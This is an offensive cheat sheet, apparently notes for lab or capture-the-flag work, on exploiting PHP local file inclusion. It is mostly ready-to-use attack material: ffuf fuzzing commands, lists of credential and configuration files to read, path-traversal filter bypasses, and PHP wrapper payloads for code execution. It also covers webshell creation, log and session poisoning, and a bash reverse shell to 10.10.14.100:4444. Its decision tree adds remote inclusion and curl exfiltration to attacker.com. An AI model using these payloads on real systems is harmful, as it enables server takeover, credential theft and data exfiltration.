


bash

```bash
# Fuzz GET parameters on known pages
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -u "https://target.com/index.php?FUZZ=../../../etc/passwd" \
     -fs <normal_response_size>

# Fuzz POST parameters
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -u "https://target.com/index.php" \
     -X POST \
     -d "FUZZ=../../../etc/passwd" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -fs <normal_response_size>

# Fuzz parameters on every discovered PHP file
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -u "https://target.com/page.php?FUZZ=test" \
     -fs <normal_response_size>
```

**Common parameter names that hint at LFI:**

```
file, path, page, include, doc, document, load, read,
template, view, content, lang, language, dir, folder,
module, section, category, theme, layout, conf, config,
func, function, feature, action, show, display
```

#### Step 2: Fuzz for the actual LFI using a wordlist

Once you have a candidate parameter:

bash

```bash
# LFI wordlist from SecLists
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
     -u "https://target.com/page.php?file=FUZZ" \
     -fs <normal_response_size>

# Other good LFI lists
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
/usr/share/wordlists/wfuzz/Injections/Traversal.txt
```

#### Step 3: Fuzz for interesting files once LFI is confirmed

bash

```bash
# Fuzz ../../../../FUZZ pattern — combine with known sensitive paths
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
     -u "https://target.com/page.php?file=../../../../FUZZ" \
     -fs <error_response_size> \
     -mc 200

# Custom quick wordlist for most impactful files
cat << 'EOF' > lfi_targets.txt
etc/passwd
etc/shadow
etc/hosts
etc/crontab
proc/self/environ
proc/self/cmdline
proc/self/status
var/log/apache2/access.log
var/log/apache2/error.log
var/log/nginx/access.log
var/log/nginx/error.log
var/log/auth.log
var/log/syslog
EOF

ffuf -w lfi_targets.txt \
     -u "https://target.com/page.php?file=../../../../FUZZ" \
     -fs <error_size>
```

--------------
### Phase 1: Find the Web Root

**Why:** Without the web root path you can’t read PHP source files, can’t write webshells, can’t understand the app structure.

#### Method 1: Read `proc/self/environ`

bash

```bash
../../../../proc/self/environ
```

Look for:

```
DOCUMENT_ROOT=/var/www/html
PWD=/var/www/html/includes
SCRIPT_FILENAME=/var/www/html/index.php
```

Any of these gives you the web root directly.

#### Method 2: Read `proc/self/cmdline`

bash

```bash
../../../../proc/self/cmdline
```

Output shows the command running the app:

```
/usr/sbin/apache2 -k start    → web root probably /var/www/html
/usr/bin/python3 app.py       → look for app.py path
php-fpm                       → check FPM config for root
```

#### Method 3: Read Apache/Nginx config

bash

```bash
# Apache
../../../../etc/apache2/sites-enabled/000-default.conf
../../../../etc/apache2/apache2.conf
../../../../etc/httpd/conf/httpd.conf        # RedHat/CentOS

# Nginx
../../../../etc/nginx/sites-enabled/default
../../../../etc/nginx/nginx.conf
../../../../etc/nginx/conf.d/default.conf
```

Look for `DocumentRoot` (Apache) or `root` (Nginx) directive.

#### Method 4: Read `proc/self/maps`

bash

```bash
../../../../proc/self/maps
```

Shows all memory-mapped files — look for paths containing `www`, `html`, `app`:

```
/var/www/html/index.php
/home/web/web/app.py
```

#### Method 5: Fuzz common web roots

bash

```bash
# Create web root wordlist
cat << 'EOF' > webroots.txt
var/www/html
var/www
srv/http
usr/share/nginx/html
home/web/web
home/www/html
opt/lampp/htdocs
var/htdocs
www/html
EOF

# Fuzz by trying to read index.php from each
ffuf -w webroots.txt \
     -u "https://target.com/page.php?file=../../../../FUZZ/index.php" \
     -fs <error_size>
```

#### Method 6: Error messages

Sometimes the app leaks the path in error messages:

bash

```bash
# Send malformed path
?file=../../../../etc/DOESNTEXIST
# Response might say: failed to open /var/www/html/includes/../../../etc/DOESNTEXIST
```

---

### Phase 2: Find the PHP Version

**Why:** PHP version tells you which `php.ini` to read, which wrappers are available, and which CVEs apply.

#### Method 1: Server response headers

bash

```bash
curl -sk https://target.com/ -I | grep -i "php\|x-powered"
# X-Powered-By: PHP/7.4.33
```

#### Method 2: Read phpinfo if exposed

bash

```bash
?file=../../../../var/www/html/phpinfo.php
?file=../../../../var/www/html/info.php
?file=../../../../var/www/html/php.php
?file=../../../../var/www/html/test.php
```

Phpinfo dumps everything — PHP version, loaded modules, all php.ini values, web root, tmp path, session save path.

#### Method 3: Fuzz for phpinfo file

bash

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u "https://target.com/FUZZ.php" \
     -mc 200 | grep -i "info\|phpinfo\|test"
```

#### Method 4: Read Apache module config

bash

```bash
# Lists enabled PHP module with version
../../../../etc/apache2/mods-enabled/php7.4.conf
../../../../etc/apache2/mods-enabled/php8.2.conf

# Or list all enabled mods
../../../../etc/apache2/mods-enabled/
```

#### Method 5: Try all common php.ini paths

bash

```bash
# Apache module php.ini
../../../../etc/php/5.6/apache2/php.ini
../../../../etc/php/7.0/apache2/php.ini
../../../../etc/php/7.2/apache2/php.ini
../../../../etc/php/7.3/apache2/php.ini
../../../../etc/php/7.4/apache2/php.ini
../../../../etc/php/8.0/apache2/php.ini
../../../../etc/php/8.1/apache2/php.ini
../../../../etc/php/8.2/apache2/php.ini
../../../../etc/php/8.3/apache2/php.ini

# Nginx FPM php.ini
../../../../etc/php/7.4/fpm/php.ini
../../../../etc/php/8.2/fpm/php.ini

# CLI php.ini
../../../../etc/php/7.4/cli/php.ini
../../../../etc/php/8.2/cli/php.ini

# Generic
../../../../etc/php.ini
../../../../usr/local/lib/php.ini
```

------------


### PHP Wrappers — When & How


```
allow_url_include = On/Off    ← controls most dangerous wrappers
allow_url_fopen   = On/Off    ← controls remote file fetching
disable_functions =           ← which functions are blocked
open_basedir =                ← filesystem jail (empty = no jail)
session.save_path =           ← where session files live
```


#### Wrapper Decision Table

|Wrapper|Needs allow_url_include|Needs allow_url_fopen|What it does|
|---|---|---|---|
|`php://filter`|❌ No|❌ No|Read file as base64/rot13 — always works|
|`php://input`|✅ Yes|❌ No|Execute PHP from POST body|
|`data://`|✅ Yes|❌ No|Inline PHP execution|
|`http://` (RFI)|✅ Yes|✅ Yes|Remote file inclusion|
|`ftp://` (RFI)|✅ Yes|✅ Yes|Remote file inclusion via FTP|
|`zip://`|❌ No|❌ No|Execute PHP from inside a zip you uploaded|
|`phar://`|❌ No|❌ No|Execute PHP from phar file you uploaded|
|`expect://`|❌ No|❌ No|Direct command execution (needs expect extension)|
#### Wrapper 1: `php://filter` — Read source code

**When:** Always try this first — needs nothing special.

bash

```bash
# Base64 encode — most reliable
?file=php://filter/convert.base64-encode/resource=/var/www/html/index.php

# Decode on Kali
echo "<base64 blob>" | base64 -d > index.php
cat index.php

# ROT13 alternative
?file=php://filter/read=string.rot13/resource=/var/www/html/config.php

# Chain filters (bypass some filters)
?file=php://filter/convert.base64-encode|convert.base64-decode/resource=/etc/passwd

# Read without encoding (if app outputs raw content)
?file=php://filter/resource=/var/www/html/index.php
```

---

#### Wrapper 2: `data://` — Inline RCE

**When:** `allow_url_include = On`

bash

```bash
# Plain text
?file=data://text/plain,<?php system($_GET['cmd']); ?>

# Base64 encoded (bypass filters checking for <?php)
# Encode: echo '<?php system($_GET["cmd"]); ?>' | base64
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+

# With command
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&cmd=id
```

#### Wrapper 3: `php://input` — POST body execution

**When:** `allow_url_include = On`

bash

```bash
# In Burp — set file parameter to php://input
GET /page.php?file=php://input HTTP/1.1

# POST body contains your PHP
POST body:
<?php system($_GET['cmd']); ?>

# Or with command directly in body
<?php system('id'); ?>
```

---

#### Wrapper 4: RFI via `http://` — Remote File Inclusion

**When:** `allow_url_include = On` AND `allow_url_fopen = On`

bash

```bash
# Host your shell on Kali
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 8080

# Include it remotely
?file=http://10.10.14.100:8080/shell.php
?file=http://10.10.14.100:8080/shell.php&cmd=id

# FTP alternative
python3 -m pyftpdlib -p 21 -w    # start FTP server on Kali
?file=ftp://10.10.14.100/shell.php
```

---

#### Wrapper 5: `zip://` — Upload + Execute

**When:** File upload exists, `allow_url_include` not needed

bash

```bash
# Create zip with PHP shell inside
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.zip shell.php

# Upload shell.zip via the app

# Reference it via zip wrapper
?file=zip://uploads/shell.zip%23shell.php
# %23 = # — selects shell.php inside the zip
```

---

#### Wrapper 6: `phar://` — Phar archive execution

**When:** File upload exists, needs phar support (usually enabled by default)

bash

```bash
# Create phar on Kali
php -r "
\$phar = new Phar('shell.phar');
\$phar->startBuffering();
\$phar->setStub('<?php __HALT_COMPILER(); ?>');
\$phar->addFromString('shell.php','<?php system(\$_GET[\"cmd\"]); ?>');
\$phar->stopBuffering();
"
# Rename to allowed extension
mv shell.phar shell.jpg

# Upload shell.jpg, then include:
?file=phar://uploads/shell.jpg/shell.php
```

---

#### Wrapper 7: `expect://` — Direct command execution

**When:** `expect` PHP extension installed (rare but powerful)

bash

```bash
# Check if expect is loaded
?file=php://filter/convert.base64-encode/resource=/etc/php/8.2/apache2/php.ini
# Look for extension=expect in decoded output

# If available
?file=expect://id
?file=expect://whoami
?file=expect://bash -c 'bash -i >& /dev/tcp/10.10.14.100/4444 0>&1'
```


### Phase 4: LFI → RCE Decision Tree

```
LFI confirmed
│
├── Check php.ini first
│   ├── allow_url_include=On + allow_url_fopen=On?
│   │   └── RFI via http:// → instant RCE (easiest path)
│   │       ?file=http://attacker/shell.php&cmd=id
│   │
│   ├── allow_url_include=On only?
│   │   ├── data:// wrapper → inline PHP execution
│   │   └── php://input → POST body execution
│   │
│   └── Both Off?
│       └── Continue below (local-only paths)
│
├── Can read access.log / error.log?
│   └── YES → Log poisoning
│             1. curl -A '<?php system($_GET["cmd"]); ?>' target
│             2. ?file=../../../../var/log/apache2/access.log&cmd=id
│
├── Can read /proc/self/environ?
│   └── YES → Environ poisoning
│             1. curl -A '<?php system($_GET["cmd"]); ?>' target
│             2. ?file=../../../../proc/self/environ&cmd=id
│
├── Can read logs via /proc/self/fd/* ?
│   └── YES → Fuzz fd/0 through fd/20
│             Same as log poisoning — inject via User-Agent
│             ?file=../../../../proc/self/fd/X&cmd=id
│
├── Session file readable + user-controlled session value?
│   └── YES → Session poisoning
│             1. Set value to <?php system($_GET["cmd"]); ?>
│             2. ?file=../../../../var/lib/php/sessions/sess_<ID>&cmd=id
│
├── File upload available?
│   ├── zip://  → upload zip containing PHP → include via zip wrapper
│   └── phar:// → upload phar as jpg → include via phar wrapper
│
├── Deserialization object in cookie/param?
│   └── YES → PHP Object Injection (BroScience technique)
│
├── php://filter only?
│   └── Read all source code → find secondary vuln
│       → hardcoded DB creds → DB access
│       → MySQL: SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'
│       → find another vuln (SSTI, SQLi, command injection)
│
└── Blind LFI (no output)?
    ├── OOB via DNS: <?php system("curl http://$(id).attacker.com"); ?>
    ├── OOB via HTTP: <?php system("curl http://attacker.com/?c=$(id|base64)"); ?>
    └── Write webshell to disk: <?php file_put_contents('/var/www/html/shell.php','<?php system($_GET[cmd]); ?>'); ?>
```

----------

### Master LFI Cheatsheet

#### Find the Parameter

bash

```bash
# Fuzz parameter names
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -u "https://target/page.php?FUZZ=../../../../etc/passwd" -fs <size>

# Fuzz LFI payloads
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
     -u "https://target/page.php?file=FUZZ" -fs <size>

# Fuzz interesting files
ffuf -w lfi_targets.txt \
     -u "https://target/page.php?file=../../../../FUZZ" -fs <size>
```

#### Find Web Root

bash

```bash
../../../../proc/self/environ          # DOCUMENT_ROOT variable
../../../../proc/self/maps             # loaded file paths
../../../../etc/apache2/sites-enabled/000-default.conf   # DocumentRoot
../../../../etc/nginx/sites-enabled/default              # root directive
```

#### Find PHP Version

bash

```bash
curl -I https://target.com | grep "X-Powered"
../../../../var/www/html/phpinfo.php   # if exposed
../../../../etc/apache2/mods-enabled/php*.conf
# Try all php.ini paths from 5.6 to 8.3
```

#### Key Files to Always Read

bash

```bash
../../../../etc/passwd                 # users
../../../../proc/self/environ          # secrets + web root
../../../../etc/apache2/sites-enabled/000-default.conf   # log paths
../../../../etc/php/X.X/apache2/php.ini  # wrapper availability
<webroot>/config.php                   # DB creds
<webroot>/includes/db_connect.php      # DB creds
<webroot>/index.php                    # follow require chains
<webroot>/.env                         # all creds
```

#### Bypass Techniques

bash

```bash
# Filter bypasses for ../
..%2f                  # URL encoded
..%252f                # double URL encoded
..%c0%af               # Unicode encoding
....//                 # double dot slash
..././                 # mixed
/....//....//          # mixed double
%2e%2e%2f              # full URL encode
%2e%2e/                # partial URL encode

# Extension bypass
../../../../etc/passwd%00.jpg          # null byte (PHP < 5.3)
../../../../etc/passwd%00              # null byte
../../../../etc/passwd/./              # trailing slash
```

#### Wrappers Quick Reference

bash

```bash
# Always works — read source
php://filter/convert.base64-encode/resource=<file>

# allow_url_include=On — inline RCE
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&cmd=id
php://input    # + POST body: <?php system('id'); ?>

# Both On — remote file inclusion
http://attacker/shell.php
ftp://attacker/shell.php

# Upload required
zip://uploads/shell.zip%23shell.php
phar://uploads/shell.jpg/shell.php

# Rare but powerful
expect://id
```

